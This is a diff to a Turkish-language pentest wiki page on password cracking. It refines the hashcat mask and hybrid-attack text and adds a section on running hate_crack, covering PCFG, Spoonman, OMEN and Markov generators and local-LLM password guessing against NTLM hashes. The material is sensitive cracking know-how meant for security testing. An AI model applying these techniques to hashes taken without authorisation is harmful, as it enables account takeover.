+Bu ön işleme kalıbı, çevrimdışı doğrulanabilen diğer biçimlere de uygulanabilir: olası büyük/küçük harf kullanımlarını, tarihleri, ayraçları, rakamları veya noktalama işaretlerini yalnızca tek bir bileşen için sıralayın, ardından nominal tam uzunluğu brute-force etmek yerine bunu kalan bileşenle birleştirin.<sup>[[4]](#references)[[5]](#references)</sup>
 
 - **Mask attack** (`-a 3`)
 
@@ -917,15 +917,15 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 
 #### Çalıştırmadan önce `.hcmask` dosyalarını doğrulayın
 
-Hatalı bir satır geçerli maskeler arasında gözden kaçabilir; bu nedenle saldırıyı başlatmadan önce dosyanın tamamını ve tahmini keyspace değerini doğrulayın. HashcatRosetta, hatalı satırı bildirir ve herhangi bir maske geçersiz olduğunda sıfır olmayan bir durum kodu döndürür; bu da kontrolü betikler veya CI için uygun hale getirir.<sup>[[6]](#references)[[9]](#references)</sup>
+Hatalı bir satır geçerli maskelerin arasında gözden kaçabilir. Bu nedenle saldırıyı başlatmadan önce dosyanın tamamını ve tahmini anahtar uzayını doğrulayın. HashcatRosetta, hatalı satırı bildirir ve maskelerden herhangi biri geçersiz olduğunda sıfır olmayan bir durum kodu döndürür. Bu sayede kontrol, betikler veya CI için uygundur.<sup>[[6]](#references)[[9]](#references)</sup>
 
 ```bash
 hashcat-rosetta masks.hcmask --verify-masks
 ```
 
-Mask dosyalarını genel CSV veya metin ayrıştırıcılarıyla normalize etmeyin. Hashcat, `?1` ile `?8` arasındaki custom charset'leri destekler, `#` işaretini yalnızca ilk byte olduğunda yorum satırı olarak kabul eder ve `?` token'larını yorumlamadan önce backslash kaçışlarını tek geçişte kaldırır. Bu nedenle `#` öncesindeki baştaki boşluklar mask verisidir ve kaçış karakterleri bir dizinin literal mi yoksa charset token'ı mı olduğunu değiştirebilir.<sup>[[6]](#references)[[9]](#references)</sup>
+Maske dosyalarını genel amaçlı CSV veya metin ayrıştırıcılarıyla normalize etmeyin. Hashcat, `?1` ile `?8` arasındaki özel karakter kümelerini destekler, `#` karakterini yalnızca ilk bayt olduğunda yorum satırı olarak kabul eder ve `?` belirteçlerini yorumlamadan önce ters eğik çizgi kaçışlarını tek geçişte kaldırır. Bu nedenle `#` öncesindeki baştaki boşluklar maske verisidir ve kaçış karakterleri bir dizinin sabit metin mi yoksa karakter kümesi belirteci mi olduğunu değiştirebilir.<sup>[[6]](#references)[[9]](#references)</sup>
 
-- Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) saldırısı
+- Kelime listesi + Maske (`-a 6`) / Maske + Kelime listesi (`-a 7`) saldırısı
 
 ```bash
 # Mask numbers will be appended to each word in the wordlist
@@ -935,13 +935,60 @@ hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
 hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```
 
+#### hate_crack ile hedefe göre eğitilmiş Hashcat denemeleri
+
+[hate_crack](https://github.com/trustedsec/hate_crack), bir hash dosyanız ve Hashcat modunu biliyor olmanız koşuluyla yerel Hashcat denemelerini yönetir. Hashcat'in ayrıca yüklenmesi gerekir. Submodule'larla klonlayın, `make` komutunu çalıştırın ve ardından etkileşimli bir oturum başlatın; örnek `1000` modu NTLM içindir, evrensel bir varsayılan değildir. Mevcut klonlarda PCFG ve PRINCE-LING seçeneklerini kullanmadan önce `git submodule update --init --recursive` komutunu çalıştırın.<sup>[[13]](#references)[[14]](#references)</sup>
+
+```bash
+git clone --recurse-submodules https://github.com/trustedsec/hate_crack.git
+cd hate_crack
+make
+hate_crack hashes.txt 1000
+```
+
+**Kurtarılan düz metinlerden bir gramer öğrenin.** Önce bir sözlük/kural geçişi çalıştırın, ardından hedefle ilgili düz metinlerle `pcfg_cracker`'ı eğitin. `config.json` dosyasında `pcfgRuleset`'i eğitilmiş ruleset'e ayarlayın ve olası yapıları Hashcat'e aktarmak için PCFG'yi (menü `20`), ya da gramer rehberliğinde bir PRINCE temel listesi oluşturmak için PRINCE-LING'i (`21`) seçin. İki üreticiyi `pcfgMaxCandidates` ve `pcfgPrinceLingMaxCandidates` ile sınırlandırın; hate_crack grameri sizin için eğitmez. PCFG, [combinator örneğindeki](#grammar-driven-combinator-attacks-encrypted-office-example) sabit gramerin aksine, temel kelime artı rakamlar ve semboller gibi yapıların olasılığını öğrenir.<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>
+
+```bash
+cd pcfg_cracker
+python3 trainer.py -t ../target-plaintexts.txt -r TARGET
+cd ..
+# Set pcfgRuleset to TARGET in config.json, then select 20 or 21.
+hate_crack hashes.txt 1000
+```
+
+**Bilinen parolalardan geriye doğru rule çıkarın.** Spoonman (menü `22`), geçerli oturumun boş olmayan `.out` dosyası da dahil olmak üzere düz metinlerden oluşan bir derlemi alır ve gözlemlenen parolaları yeniden oluşturabilecek küçük harfli baseword'ler ve Hashcat rule'ları türetir. Rule'ları, derlemdeki kaç parolayı ürettiklerine göre sıralar. En yüksek %50 kapsama sağlayan katmanla başlayın ve yalnızca eklenen keyspace gerekçelendirilebiliyorsa kapsamı genişletin; eksik stem kapsama alanını, mutasyon değil de sınırlıyorsa, türetilen baseword'leri diğer ilgili wordlist'lerle birleştirin. Hashcat, rule başına en fazla 31 işlev kabul eder ve konum alfabesi yalnızca `0`–`35` indekslerini adresler; parola kodlanamadığında Spoonman, olduğu gibi bir baseword ve no-op rule kullanır. Çok büyük derlemler, sınırlı bellek sayaç sınırına takılabilir; bu nedenle tam yeniden oluşturma yapıldığını varsaymak yerine bildirilen kapsama oranını kontrol edin. Çıktıyı bağımsız olarak yeniden kullanmadan önce [Hashcat rule davranışı](#explain-and-profile-rule-files) bölümüne bakın.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
+
+**Eldeki kanıta uygun bir generator seçin.** OMEN (`13`), bir parola listesinden karakter geçiş modeli eğitir ve adayları olasılık sırasına göre, `omenMaxCandidates` ile belirlenen sınıra kadar listeler. Markov brute force (`15`) bunun yerine geçerli `.out` dosyasındaki crack edilmiş parolalardan veya seçilmiş bir listeden `.hcstat2` tablosu oluşturabilir ve artımlı uzunluk aralığını deneyebilir. Hedefle ilgili bilgiler parola yerine düzyazı biçimindeyse N-gram (`16`), gzip girdisi de dahil olmak üzere bir derlemi `ngramX.bin` dosyasına aktarır; varsayılan grup boyutu üçtür. Bunlar, aynı aday listesinin üç kopyası değil, birbirine alternatif yöntemlerdir.<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>
+
+**Yalnızca küçük ve makul havuzları genişletin.** Permutation (`17`), her girdi kelimesindeki tüm karakterleri yeniden sıralar; bu nedenle sekiz karakterli tek bir kelime bile `8!` sıralama üretir. Combipow (`19`), kısa bir passphrase kelime havuzundaki boş olmayan alt kümelerin kombinasyonlarını üretir; `-s` boşluk ekler ve araç 63'ten fazla girdi satırını reddeder. Combinator (`6`), `--sepFill` ile birden fazla wordlist'i ayraçlarla birleştirebilir; iki listeyi sıradan biçimde birleştirme işlemi yukarıdaki [yerel Hashcat combinator](#hashcat-attacks) tarafından karşılanır.<sup>[[13]](#references)[[14]](#references)</sup>
+
+**Geri bildirim saldırılarına bütçe ayırın.** Fingerprint (`5`), her turda tüm derlemi yeniden genişletmek yerine, yeni crack edilmiş parolaları parça uzunluğunu artırarak yinelemeli biçimde genişletir; kombinasyon keyspace eşiği, aşırı büyük bir `-a 1` geçişini atlar. Hybrid (`7`), daha geniş `?a` öne/sona ekleme maskelerinden önce daha ucuz `?s?d` eklemelerini dener; `hcatHybridMaxRuntime` çalıştırma süresini sınırlar. Bu önemlidir; çünkü hybrid geçişinin maliyeti wordlist boyutunun maske alanıyla çarpımına bağlıdır ve büyük bir listeye uygulanan geniş bir maske, ilk geçişlerin maliyetini çok aşabilir.<sup>[[13]](#references)[[14]](#references)</sup>
+
+**Kurtarılan parolalardan yerel LLM ile adaylar üretin.** İlk geçiş boş olmayan bir `<hashfile>.out` dosyası oluşturduktan sonra, hate_crack'in LLM saldırısı (ana menü `12`, **Crack edilmiş parolalar** alt menüsü `3`) hedefe özgü baseword'leri, yılları, sonekleri ve büyük-küçük harf kullanımını tahmin edebilir, ardından yeni adayları Hashcat'e gönderebilir. Küçük derlemlerde kurtarılan düz metinler model istemine eklenebilir; daha büyük derlemler ise bunun yerine istatistiklere dönüştürülerek özetlenir. Bu yöntem, yalnızca yukarıdaki sabit [rule'ları](#explain-and-profile-rule-files) veya [maskeleri](#hashcat-attacks) yeniden denemek yerine, gözlemlenen kullanım alışkanlıklarını geneller.<sup>[[13]](#references)[[14]](#references)</sup>
+
+hate_crack'in `.env` dosyasında önceden sunulmakta olan yerel bir Ollama modelini yapılandırın; araç modeli otomatik olarak indirmez. `OLLAMA_NO_CLOUD=true`, cloud etiketli modelleri ve site dışındaki endpoint adreslerini reddeder. Yalnızca localhost endpoint'i kullanmak yeterli değildir: Ollama, `-cloud` modeline uzaktan proxy uygulayabilir ve istemlerde kurtarılan düz metinler veya derlem istatistikleri bulunabilir. Bu ayar özel ağ endpoint'lerine yine de izin verir ve aktarım proxy'si olmadığını garanti edemez; bu nedenle istemci verilerini göndermeden önce çıkarım yolunu doğrulayın.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
+
+```dotenv
+LLM_BACKEND=ollama
+OLLAMA_HOST=localhost:11434
+OLLAMA_MODEL=qwen3:4b-instruct
+OLLAMA_NO_CLOUD=true
+```
+
+```bash
+hate_crack hashes.txt 1000
+# Select 12 (LLM Attack), then 3 (Cracked passwords).
+```
+
+Daha büyük bir bütçe ayırmadan önce aday verimini daha ucuz rule, mask ve hedefe göre eğitilmiş denemelerle karşılaştırın. Model tahminler üretir; Hashcat bunları hash'lere karşı test etmeye devam eder.<sup>[[13]](#references)[[14]](#references)</sup>
+
 #### Hashcat modları
 
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
 
-Cracking Linux Hashes - /etc/shadow dosyası
+Linux Hash Cracking - /etc/shadow dosyası
 
 ```
  500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
@@ -971,13 +1018,19 @@ Yaygın Uygulama Hash'lerini Kırma
 
 ## References
 
-- [1] [GoBruteforcer'ın İçinde: Yapay Zeka Tarafından Oluşturulan Sunucu Varsayılanları, Zayıf Parolalar ve Kripto Odaklı Kampanyalar](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+- [1] [GoBruteforcer’ın İçinden: AI tarafından oluşturulan sunucu varsayılanları, zayıf parolalar ve kripto odaklı kampanyalar](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
 - [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
-- [3] [Hashcat örnek hash'leri ve Microsoft Office modları](https://hashcat.net/wiki/doku.php?id=example_hashes)
-- [4] [Hashcat combinator saldırısı](https://hashcat.net/wiki/doku.php?id=combinator_attack)
+- [3] [Hashcat örnek hash’leri ve Microsoft Office modları](https://hashcat.net/wiki/doku.php?id=example_hashes)
+- [4] [Hashcat birleştirme saldırısı](https://hashcat.net/wiki/doku.php?id=combinator_attack)
 - [5] [Kimlik bilgilerinin miras planlaması](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
 - [6] [HashcatRosetta deposu](https://github.com/bandrel/HashcatRosetta)
 - [7] [Hashcat debug-file uygulaması](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
 - [8] [Hashcat komut satırı yardımı](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
-- [9] [HashcatRosetta: Parola Kırmanın Rosetta Taşını Okumak](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
+- [9] [HashcatRosetta: Parola kırmanın Rosetta Taşı’nı okumak](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
+- [10] [PCFG Cracker deposu ve kullanımı](https://github.com/lakiw/pcfg_cracker)
+- [11] [OMEN deposu ve kullanıcı kılavuzu](https://github.com/RUB-SysSec/OMEN)
+- [12] [Spoonman’ın özgün sorunu ve kural türetme tasarımı](https://github.com/trustedsec/hate_crack/issues/169)
+- [13] [hate_crack deposu ve saldırı belgeleri](https://github.com/trustedsec/hate_crack)
+- [14] [2.0’dan Bu Yana hate_crack’teki Yenilikler](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
+- [15] [hate_crack LLM hedef politikası](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
 {{#include ../banners/hacktricks-training.md}}
